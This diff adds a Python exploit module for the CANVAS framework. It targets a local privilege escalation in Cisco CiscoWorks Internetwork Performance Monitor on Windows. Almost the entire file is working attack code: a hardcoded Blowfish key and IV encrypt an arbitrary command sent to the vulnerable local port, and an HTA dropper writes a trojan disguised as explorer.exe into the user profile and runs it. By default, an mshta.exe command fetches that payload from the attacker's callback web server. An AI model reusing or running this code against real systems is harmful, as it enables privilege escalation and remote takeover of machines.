@@ -1,0 +1,383 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2008
+#
+
+import sys
+import random
+import time
+import thread
+import base64
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from libs.spkproxy import header, body
+from libs.canvasos import *
+
+import struct
+import canvasengine
+
+# GUI info
+NAME = "Cisco CiscoWorks Internetwork Performance Monitor Local Privilege Escalation Vulnerability"
+
+DESCRIPTION = "Local privilege escalation vulnerability in Cisco CiscoWorks Internetwork Performance Monitor"
+DOCUMENTATION = {}
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["Date public"] = "Not public"
+DOCUMENTATION["VersionsAffected"] = "CiscoWorks IPM 2.6 + CSCsj06260 patch"
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+
+VERSION = "0.1"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Local"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+You need to set the vulnerable tcp port of IPM. Select the listening port of javaw.exe with
+CWB_ipmRTPServer.exe, CWB_ipmSnmpd.exe or CWB_msgLogServer.exe. This port is slightly
+higher than 1024. There are 2 ports in fact, select the highest.
+
+You need pycrypto to use this exploit.
+
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+	0: "Windows",
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.TROJANMODE = 0
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 0
+        self.version = 0
+        self.cmd = ""
+        self.trojanname = "index.hta"
+        return
+
+    def file4hta(self, exename):
+    	evilprog = "explorer.exe"
+        e = []
+        for a in exename:
+	  for b in a:
+	    if b == "\r":
+	      d = "0d"
+	    elif b == "\n":
+	      d = "0a"
+	    elif b == "\0":
+	      d = "00"
+	    else:
+	      c = hex(ord(b))
+	      d = c.replace("0x", "")
+
+	    if len(d) == 1:
+	      d = "0"+d
+
+	    e.append(d)
+	
+	i = 0
+	j = 0
+	l = len(e)
+
+	hta = "<SCRIPT language=vbs>\n\n"
+	while 1:
+	  hta += " prog = prog & \""
+
+	  while i != 24:
+	    hta += "%s," % e[j]
+	    if j == l-1:
+	      break
+	    i += 1
+	    j += 1
+
+	  if j == l-1:
+	    hta = hta[:-1] + "\"\n\n"
+	    break
+	  hta += "\"\n"
+	  i = 0
+
+	hta += " tmp = Split(prog, \",\")\n"	
+	hta += " Set fso = CreateObject(\"Scripting.FileSystemObject\")\n"
+	hta += " Set shell = CreateObject(\"WScript.Shell\")\n"
+	hta += " userprofile = shell.ExpandEnvironmentStrings(\"%USERPROFILE%\")\n"
+	hta += " path = userprofile & \"\\\" & \"%s\"\n" % evilprog
+	hta += " Set f = fso.CreateTextFile(path, True)\n\n"
+	hta += " For i = 0 To UBound(tmp)\n"
+	hta += "   prog = Int(\"&H\" & tmp(i))\n"
+	hta += "   f.Write Chr(prog)\n"
+	hta += " Next\n\n"
+	hta += " f.Close\n"
+	hta += " shell.Run Chr(34) & path & Chr(34), 7, false\n"
+	hta += " self.Close\n"
+	hta += "</SCRIPT>\n"
+
+	return hta
+ 
+    def maketrojan(self):    	
+        t_os = canvasos(targets[self.version])
+        t_os.arch = "X86"
+        
+        self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os)        
+        self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojanname))        
+        self.htafile = self.file4hta(self.mosdeftrojan)
+        file(self.trojanname, "wb").write(self.htafile)
+        self.setInfo("%s - done"%(NAME))
+        ret = len(self.mosdeftrojan) != 0
+
+        return ret
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()
+        
+        self.maketrojan()
+                
+        if clientheader.URL.count(self.trojanname):
+            self.log("Sending MOSDEF trojan")
+            f = open(self.trojanname, "rb")
+            sploitstring = f.read()
+            f.close()
+            os.remove(self.trojanname)
+            self.log("Sending %d bytes"%len(sploitstring))
+            h.addHeader("Content-type","binary/octet-stream")
+            h.addHeader("Connection","close")
+            b.setBody(sploitstring)
+
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]
+
+    #################################################################################################################
+    # Code from httpserver.py
+    def listen(self):                        
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(("0.0.0.0", 80))
+        s.listen(1)
+
+        if not s:
+            return 0
+            
+        s.set_timeout(5)
+        
+        self.s = s
+        
+        return s 
+
+    def accept(self, s=None ):
+        """
+        Try to accept one connection
+        returns true if we found one
+        """
+ 
+        if s == None:
+            s = self.s 
+        try:
+            infd, addr = s.accept()
+        except timeoutsocket.Timeout:
+            return 
+        if infd == -1:
+            return
+
+        self.handle(infd)
+        return True 
+        
+    def handle(self, infd): 
+        self.log("Handling connection")
+        clientheader = header(state = "SERVER")
+        clientheader.ssl = self.ssl
+        ret = clientheader.readdata(infd)
+        clientbody = body()
+        
+        if clientheader.gotGoodHeader():
+            if clientheader.bodySize()>0 or clientheader.wasChunked:
+                self.log("Reading body")
+                clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+                self.log("Read body")
+
+        self.log("Creating exploit response")
+
+        servheader,servbody = self.makesploit(clientheader,clientbody)
+        
+        self.log("Responding")
+        
+        bodydata="".join(servbody.data)
+                    
+        response = ""
+        response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+	
+        self.log(response)
+
+        for akey in servheader.headerValuesDict.keys():
+            if akey not in [ "Content-Length", "Content-length"]:
+                response += servheader.grabHeader(akey)
+        self.log("Sending header data of %d bytes"%len(response))
+        chunked = 0 
+        
+        if not chunked:
+            response+="Content-Length: "+str(len(bodydata))+"\r\n"
+        response+="\r\n"
+        response+="".join(bodydata)
+        self.log("Total response length is %d bytes"%len(response))
+        
+        try:
+            infd.sendall(response)
+        except socket.error:
+            self.log("Connection closed by peer")
+        self.log("Response sent")
+        infd.close()
+        
+        return 
+    #
+    #################################################################################################################
+        
+    def startHTTPServer(self):
+        s = self.listen()                
+                        
+        if not s:
+            self.log("Failed to listen - not running")
+            return 0
+        while 1:
+            if self.state == self.HALT:
+                self.s.close()
+                break
+            self.accept()
+
+        self.setInfo("%s on %s:%d - done (success!)"%(NAME, self.bindip, self.bindport))
+        
+        return 1
+
+
+    def encryptcmd(self, cmd):
+        try:	
+        	from Crypto.Cipher import Blowfish
+        except:
+        	self.log("Error: you need pycrypto to use this exploit")	
+        	return ""
+
+        # Encrypt payload
+        try:
+        	self.cipher = Blowfish.new("\x41\x20\x36\x54\x78\x63\x39\x1f", Blowfish.MODE_CBC, "\x12\x12\x20\x01\x10\x09\x20\x02")
+        except:
+        	self.log("Error: you need pycrypto to use this exploit")	
+        	return ""
+				        
+        cleartext = self.cmd
+        encrypted = ""
+        b64encoded = ""
+
+        length = len(cleartext)
+	
+        # Pad the cleartext with 0    
+        if not (length % 8 == 0):
+        	if (length < 8):
+        		cleartext += "\x00"*(8 - length)
+        	else:    		
+        		cleartext += "\x00"*(((length/8)+1)*8 - length)    	
+        
+        # Encrypt data with Blowfish CBC mode
+        encrypted = self.cipher.encrypt(cleartext)
+    
+        # Base64 Encode
+        b64encoded = base64.b64encode(encrypted)            
+
+        return b64encoded        
+    
+    
+    def run_attack(self, node):
+        """
+        Run the attack on this node
+        """
+
+        self.node = node
+        nodename = node.getname()
+   	
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))                
+        self.log("Attacking %s:%d"%(self.host, self.port))                        		
+
+        self.log("Command: %s" % self.cmd)
+        self.cmd = self.cmd + "\n"
+        
+        encryptedcmd = self.encryptcmd(self.cmd)
+        
+        if (encryptedcmd == ""):
+        	return 0
+
+        # Start attack on selected node								                        
+        fd = node.shell.socket("tcp")
+        
+        try:        	
+        	node.shell.connect(fd, "127.0.0.1", self.port, "tcp", 1)                     
+       	except:
+        	self.log('Could not connect to port %s:%s' % (self.host, self.port))
+        	return 0        
+                        
+        node.shell.send(fd, encryptedcmd)        
+        node.shell.close(fd)
+
+        return 1
+
+
+    def run(self):
+        """
+        This run happens on all nodes selected
+        returns 1 if we succeed on any node
+        """
+
+        self.setInfo("%s (in progress)"%(NAME))
+        self.getargs()
+        success = 0 
+
+        # Check arguments
+        self.host = self.target.interface        
+        self.cmd = self.argsDict.get("cmd", self.cmd)       
+        self.port = int(self.argsDict.get("port", self.port))        
+ 
+        if (self.cmd == ""):
+          self.TROJANMODE = 1
+          self.cmd = "mshta.exe http://" + self.callback.ip + "/" + self.trojanname        	
+          thread.start_new_thread(self.startHTTPServer,())
+
+        for node in self.argsDict["passednodes"]:            
+            type = node.nodetype
+            nodename = node.getname()
+            caps = node.capabilities
+
+            if "win32api" not in caps:
+                self.log("Node %s not a Win32 node..." % nodename)
+                continue
+                
+            ret = self.run_attack(node)
+            
+            if ret:
+                success = 1
+
+        if (self.TROJANMODE == 1):
+        	while 1:
+        		time.sleep(1)
+                  
+        return success
+               
+        		
+
+if __name__ == '__main__':
+    print "This win32 local module is meant to be run only within CANVAS"
